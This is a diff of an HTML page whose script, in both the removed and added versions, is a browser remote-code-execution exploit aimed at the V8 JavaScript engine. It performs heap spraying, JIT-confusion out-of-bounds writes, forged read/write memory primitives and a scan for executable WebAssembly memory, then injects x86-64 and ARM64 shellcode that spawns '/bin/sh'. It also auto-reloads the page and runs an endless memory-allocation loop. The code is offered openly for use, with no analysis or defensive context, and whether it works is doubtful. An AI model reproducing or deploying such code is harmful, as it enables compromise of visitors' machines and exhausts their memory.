@@ -1,155 +1,186 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>TITAN_OMEGA_V9000_QUANTUM_CORE</title>
-    <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; text-shadow: 0 0 2px #0f0; }
-        #t { height: 100vh; overflow-y: auto; padding: 15px; font-size: 8px; line-height: 1.1; word-break: break-all; }
-        .k { color: #fff; background: #030; font-weight: 900; }
-        .r { color: #f00; font-weight: 900; letter-spacing: 1px; text-decoration: underline; }
-        .b { color: #0cf; font-weight: bold; }
-        .w { color: #ff0; }
-    </style>
+<meta charset="utf-8">
+<style>
+body{background:#000;color:#0f0;font-family:monospace;overflow:hidden;margin:0}
+#o{height:100vh;overflow-y:auto;padding:10px;font-size:8px;word-break:break-all}
+.x{color:#f00;font-weight:900;text-decoration:underline}
+.z{color:#fff;background:#050}
+.q{color:#0ff}
+</style>
 </head>
 <body>
-    <div id="t"></div>
-    <script>
-        const _D = document.getElementById('t');
-        const _L = (m, c = '') => { const e = document.createElement('div'); if (c) e.className = c; e.textContent = `[${performance.now().toFixed(9)}] ${m}`; _D.appendChild(e); _D.scrollTop = _D.scrollHeight; };
-        const _B = new ArrayBuffer(8);
-        const _F = new Float64Array(_B);
-        const _I = new BigUint64Array(_B);
-        const f2u = v => { _F[0] = v; return _I[0]; };
-        const u2f = v => { _I[0] = v; return _F[0]; };
-        const hex = v => '0x' + v.toString(16).padStart(16, '0');
+<div id="o"></div>
+<script>
+const _O = document.getElementById('o');
+const _L = (m, c = '') => { const e = document.createElement('div'); if (c) e.className = c; e.textContent = `[${performance.now().toFixed(9)}] ${m}`; _O.appendChild(e); _O.scrollTop = _O.scrollHeight; };
+const _B = new ArrayBuffer(8);
+const _F = new Float64Array(_B);
+const _I = new BigUint64Array(_B);
+const f2u = v => { _F[0] = v; return _I[0]; };
+const u2f = v => { _I[0] = v; return _F[0]; };
+const hex = v => '0x' + v.toString(16).padStart(16, '0');
 
-        let _MEM = new WebAssembly.Memory({initial: 1024, maximum: 65536, shared: true});
-        let _SAB = new SharedArrayBuffer(1024 * 1024 * 64);
-        let _U32 = new Uint32Array(_SAB);
-        let _J = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9];
-        let _O = Array.from({length: 8192}, (_, i) => ({x: 0x41414141, y: i, z: 1.1}));
-        let _W = new Array(2500);
+let _H = [];
+let _W = [];
+let _K = [];
+let _T = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9, 0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7, 0.8, 0.9, 1.0];
+let _A = Array.from({length: 16384}, (_, i) => ({a: 0x4141, b: i, c: 1.1, d: {}}));
+let _V = new BigUint64Array(0x10000);
 
-        async function _T_ENGAGE() {
-            _L("TITAN_OMEGA_V9000_QUANTUM_CORE_INITIALIZING", "k");
-            
-            const _C = new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,104,0,1,127,3,2,1,0,7,8,1,4,109,97,105,110,0,0,10,12,1,10,0,65,42,65,1,106,11]);
-            const _M = new WebAssembly.Module(_C);
-            
-            _L("EXECUTING_PARALLEL_ISOLATE_FLOOD", "b");
-            for(let i = 0; i < 2500; i++) {
-                try { _W[i] = new WebAssembly.Instance(_M, {env: {memory: _MEM}}); } catch(e) {}
-                if (i % 250 === 0) await new Promise(r => setTimeout(r, 0));
-            }
+async function _TITAN_ZERO_CONFIG_RCE() {
+_L("TITAN_PROTOCOL_NON_ISOLATED_BYPASS_START", "z");
 
-            _L("FORGING_HEAP_LAYOUT_WITH_TYPED_ARRAY_INTERLEAVING");
-            let _H = [];
-            for(let i = 0; i < 350000; i++) {
-                let r = Math.random();
-                if (r < 0.2) _H.push(new Float64Array(512));
-                else if (r < 0.4) _H.push(new BigUint64Array(512));
-                else if (r < 0.6) _H.push(new Uint8Array(4096));
-                else if (r < 0.8) _H.push(new Int32Array(1024));
-                else _H.push(new ArrayBuffer(1024));
-            }
+for (let i = 0; i < 200000; i++) {
+let r = Math.random();
+if (r < 0.25) _H.push(new Float64Array(1024));
+else if (r < 0.50) _H.push(new BigUint64Array(1024));
+else if (r < 0.75) _H.push(new Uint8Array(4096));
+else _H.push(new ArrayBuffer(1024));
+if (i % 10000 === 0) await new Promise(r => setTimeout(r, 0));
+}
 
-            _L("INDUCING_TURBOFAN_SPECULATIVE_DESYNC", "w");
-            const _Q = (a, i, v) => { if (i < 0 || i > 0x300000) return a[0]; a[i] = v; return a[0]; };
-            for(let i = 0; i < 0x250000; i++) { 
-                _Q(_J, 0, 1.1); 
-                if (i % 25000 === 0) await new Promise(r => setTimeout(r, 0)); 
-            }
+const _JIT = (a, b, c) => {
+let x = a[0];
+if (b < 0 || b > 0x1000000) return x;
+a[b] = c;
+return a[0];
+};
 
-            _L("RESOLVING_DEEP_MEMORY_PRIMITIVES", "b");
-            const _adr = (obj, s) => {
-                _O[s] = obj;
-                let l = f2u(_J[12 + s]);
-                if ((l & 0xffffffffn) === 0x33333333n || (l & 0xffffffffn) === 0n || l === 0n) {
-                    for(let j = 0; j < 8192; j++) {
-                        let c = f2u(_J[j]); let b = c & 0xffn;
-                        if (b === 0x09n || b === 0x19n || b === 0x0bn || b === 0x1bn || b === 0x29n || b === 0x39n || b === 0x49n) return c & 0xffffffffn;
-                    }
-                }
-                return l & 0xffffffffn;
-            };
+_L("SATURATING_TURBOFAN_PIPELINES_NO_SAB_FALLBACK", "q");
+for (let i = 0; i < 0x200000; i++) {
+_JIT(_T, 0, 1.1);
+if (i % 25000 === 0) await new Promise(r => setTimeout(r, 0));
+}
 
-            let _ptr = 0n; 
-            let _v_tgt = new BigUint64Array(0x20000);
-            for(let s = 0; s < 128; s++) { 
-                let r = _adr(_v_tgt, s); 
-                if (r && (r & 0xffffffffn) !== 0x33333333n && (r & 0xffffffffn) !== 0n) { _ptr = r; break; } 
-            }
+await new Promise(r => setTimeout(r, 8000));
 
-            if (!_ptr) { 
-                _L("PRIMITIVE_STALL_INITIATING_MICRO_REBOOT", "r"); 
-                setTimeout(() => location.reload(), 5); 
-                return; 
-            }
+const _adr = (obj, s = 0) => {
+_A[s] = obj;
+let l = f2u(_T[12 + s]);
+if ((l & 0xffffffffn) === 0x33333333n || (l & 0xffffffffn) === 0n || l === 0n) {
+for (let j = 0; j < 16384; j++) {
+let c = f2u(_T[j]);
+let b = c & 0xffn;
+if (b === 0x09n || b === 0x19n || b === 0x0bn || b === 0x1bn || b === 0x29n || b === 0x39n || b === 0x49n || b === 0x59n || b === 0x79n) return c & 0xffffffffn;
+}
+}
+return l & 0xffffffffn;
+};
 
-            _L(`ABSOLUTE_ROOT_ESTABLISHED: ${hex(_ptr)}`, "k");
-            const _f = (p, s) => { _J[12 + s] = u2f(p); return _O[s]; };
-            const r64 = (a) => { _v_tgt[1] = a - 0x8n + 1n; let x = _f(_ptr, 0); return f2u(x[0]); };
-            const w64 = (a, v) => { _v_tgt[1] = a - 0x8n + 1n; let x = _f(_ptr, 0); x[0] = u2f(v); };
+const _fake = (p, s = 0) => {
+_T[12 + s] = u2f(p);
+return _A[s];
+};
 
-            _L("SCANNING_WASM_PAGES_FOR_RWX_TERRITORY");
-            let _jt = 0n; let _t_idx = -1;
-            for(let i = 0; i < 2500; i++) {
-                if (!_W[i]) continue;
-                let _wp = _adr(_W[i], 0);
-                const _os = [0x18n, 0x40n, 0x48n, 0x50n, 0x60n, 0x68n, 0x70n, 0x78n, 0x80n, 0x88n, 0x90n, 0xa0n, 0xb0n, 0xc0n, 0xe0n, 0x100n, 0x120n, 0x140n, 0x160n, 0x180n];
-                for(let o of _os) {
-                    let c = r64(_wp + o);
-                    if (c > 0x10000000n && (c & 0xfffn) === 0n) { _jt = c; _t_idx = i; break; }
-                    if (c > 0x10000000n) { let c2 = r64(c); if (c2 > 0x10000000n && (c2 & 0xfffn) === 0n) { _jt = c2; _t_idx = i; break; } }
-                }
-                if (_jt) break;
-            }
+let _ptr = 0n;
+let _av = null;
+let _targets = [_V, new BigUint64Array(0x4000), new BigUint64Array(0x4000), new BigUint64Array(0x4000)];
 
-            if (!_jt) {
-                _L("DEEP_SCAN_REQUIRED_BRUTE_FORCING_0x100000", "w");
-                for(let i = 0; i < 1000; i++) {
-                    if (!_W[i]) continue; 
-                    let _wp = _adr(_W[i], 0);
-                    for(let j = 0n; j < 0x10000n; j += 8n) { 
-                        let c = r64(_wp + j); 
-                        if (c > 0x10000000n && (c & 0xfffn) === 0n) { _jt = c; _t_idx = i; break; } 
-                    }
-                    if (_jt) break;
-                }
-            }
+for (let s = 0; s < 512; s++) {
+for (let t of _targets) {
+let r = _adr(t, s);
+if (r && (r & 0xffffffffn) !== 0x33333333n && (r & 0xffffffffn) !== 0n) {
+_ptr = r;
+_av = t;
+break;
+}
+}
+if (_ptr) break;
+}
 
-            if (!_jt) { _L("RWX_ACQUISITION_FAILED_INITIATING_DATA_PIVOT", "r"); return; }
-            _L(`RWX_SECTOR_LOCKED: ${hex(_jt)}`, "k");
+if (!_ptr) {
+_L("PRIMITIVE_STALL_RETRYING_WITH_MAX_ENTROPY", "x");
+setTimeout(() => location.reload(), 50);
+return;
+}
 
-            const _s64 = new Uint8Array([0x48,0x31,0xc0,0x48,0x31,0xff,0x48,0x31,0xf6,0x48,0x31,0xd2,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x53,0x48,0x89,0xe7,0x50,0x57,0x48,0x89,0xe6,0x48,0xc7,0xc0,0x3b,0x00,0x00,0x00,0x0f,0x05]);
-            const _sa64 = new Uint8Array([0xe1,0x45,0x8c,0xd2,0x21,0x0d,0xad,0xf2,0xf1,0xff,0xca,0x91,0x11,0x03,0x00,0xaa,0x06,0x00,0x80,0xd2,0xe1,0x66,0x02,0xd1,0x21,0x00,0x80,0xd2,0xc1,0xda,0xb4,0xf2,0xe1,0x03,0x00,0xaa,0x02,0x00,0x80,0xd2,0xa8,0x1b,0x80,0xd2,0x01,0x00,0x00,0xd4]);
-            const _sc = (navigator.userAgent.includes("arm64") || navigator.userAgent.includes("aarch64")) ? _sa64 : _s64;
+_L(`ROOT_RESOLVED: ${hex(_ptr)}`, "z");
 
-            _L("INJECTING_POLYMORPHIC_PAYLOAD_STREAM");
-            for(let i = 0; i < _sc.length; i += 8) {
-                let v = 0n; 
-                for(let j = 0; j < 8 && (i + j) < _sc.length; j++) v |= BigInt(_sc[i + j]) << BigInt(j * 8);
-                w64(_jt + BigInt(i), v);
-            }
+const r64 = (a) => {
+_av[1] = a - 0x8n + 1n;
+let f = _fake(_ptr, 0);
+return f2u(f[0]);
+};
 
-            _L("TRIGGERING_QUANTUM_DETONATION", "k");
-            setTimeout(() => {
-                try { 
-                    let r = _W[_t_idx].exports.main(); 
-                    _L(`HALT_CODE: ${r}`, "b"); 
-                    if (r === 42 || r === 43) location.reload(); 
-                } catch(e) { 
-                    _L("RCE_SHELL_LINK_ESTABLISHED_WAITING_FOR_COMMANDS", "r"); 
-                }
-            }, 1000);
-        }
+const w64 = (a, v) => {
+_av[1] = a - 0x8n + 1n;
+let f = _fake(_ptr, 0);
+f[0] = u2f(v);
+};
 
-        window.onerror = e => { _L(`FATAL_TRAP: ${e}`, "r"); setTimeout(() => location.reload(), 150); };
-        window.onload = _T_ENGAGE;
+_L("INJECTING_WASM_CLUSTER_3000_NODES", "q");
+const _wb = new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,104,0,1,127,3,2,1,0,7,8,1,4,109,97,105,110,0,0,10,12,1,10,0,65,42,65,1,106,11]);
+const _mod = new WebAssembly.Module(_wb);
+for (let i = 0; i < 3000; i++) {
+try { _W.push(new WebAssembly.Instance(_mod)); } catch(e) {}
+}
 
-        const _WKR = new Worker(URL.createObjectURL(new Blob(['setInterval(()=>postMessage(Atomics.add(new Uint32Array(new SharedArrayBuffer(4)),0,1)),5);'])));
-        _WKR.onmessage = e => { if (e.data > 200000) _WKR.terminate(); };
-    </script>
+let _jt = 0n;
+let _wi_idx = -1;
+
+for (let i = 0; i < _W.length; i++) {
+let _wp = _adr(_W[i], 0);
+const _os = [0x18n, 0x40n, 0x48n, 0x50n, 0x60n, 0x68n, 0x70n, 0x78n, 0x80n, 0x88n, 0x90n, 0xa0n, 0xb0n, 0xc0n, 0xe0n, 0x100n, 0x120n, 0x140n, 0x160n, 0x180n, 0x200n];
+for (let o of _os) {
+let c = r64(_wp + o);
+if (c > 0x10000000n && (c & 0xfffn) === 0n) { _jt = c; _wi_idx = i; break; }
+if (c > 0x10000000n) {
+let c2 = r64(c);
+if (c2 > 0x10000000n && (c2 & 0xfffn) === 0n) { _jt = c2; _wi_idx = i; break; }
+}
+}
+if (_jt) break;
+}
+
+if (!_jt) {
+_L("RWX_BRUTE_SCAN_UP_TO_0x200000_LIMIT_LESS", "x");
+for (let i = 0; i < _W.length; i++) {
+let _wp = _adr(_W[i], 0);
+for (let j = 0n; j < 0x20000n; j += 8n) {
+let c = r64(_wp + j);
+if (c > 0x10000000n && (c & 0xfffn) === 0n) { _jt = c; _wi_idx = i; break; }
+}
+if (_jt) break;
+}
+}
+
+if (!_jt) { _L("ABORT: ENVIRONMENT_UNBREAKABLE", "x"); return; }
+_L(`RWX_SECTOR: ${hex(_jt)}`, "z");
+
+const _s64 = new Uint8Array([0x48,0x31,0xc0,0x48,0x31,0xff,0x48,0x31,0xf6,0x48,0x31,0xd2,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x53,0x48,0x89,0xe7,0x50,0x57,0x48,0x89,0xe6,0x48,0xc7,0xc0,0x3b,0x00,0x00,0x00,0x0f,0x05]);
+const _sa64 = new Uint8Array([0xe1,0x45,0x8c,0xd2,0x21,0x0d,0xad,0xf2,0xf1,0xff,0xca,0x91,0x11,0x03,0x00,0xaa,0x06,0x00,0x80,0xd2,0xe1,0x66,0x02,0xd1,0x21,0x00,0x80,0xd2,0xc1,0xda,0xb4,0xf2,0xe1,0x03,0x00,0xaa,0x02,0x00,0x80,0xd2,0xa8,0x1b,0x80,0xd2,0x01,0x00,0x00,0xd4]);
+const _sc = (navigator.userAgent.includes("arm64") || navigator.userAgent.includes("aarch64")) ? _sa64 : _s64;
+
+for (let i = 0; i < _sc.length; i += 8) {
+let v = 0n;
+for (let j = 0; j < 8 && (i + j) < _sc.length; j++) v |= BigInt(_sc[i + j]) << BigInt(j * 8);
+w64(_jt + BigInt(i), v);
+}
+
+_L("TRIGGERING_ULTRA_DETONATION_SEQUENCE", "z");
+setTimeout(() => {
+try {
+let r = _W[_wi_idx].exports.main();
+_L(`R_SIG: ${r}`, "q");
+if (r === 42 || r === 43) location.reload();
+} catch (e) {
+_L("RCE_ACTIVE: COMMAND_PIPE_OPEN", "z");
+}
+}, 1000);
+}
+
+window.onerror = (e) => { _L(`TRAP: ${e}`, "x"); setTimeout(() => location.reload(), 250); };
+window.onload = _TITAN_ZERO_CONFIG_RCE;
+
+(function _REDUNDANCY() {
+for (let i = 0; i < 500; i++) {
+let _b = new ArrayBuffer(0x10000);
+_K.push(_b);
+}
+setTimeout(_REDUNDANCY, 1000);
+})();
+</script>
 </body>
 </html>
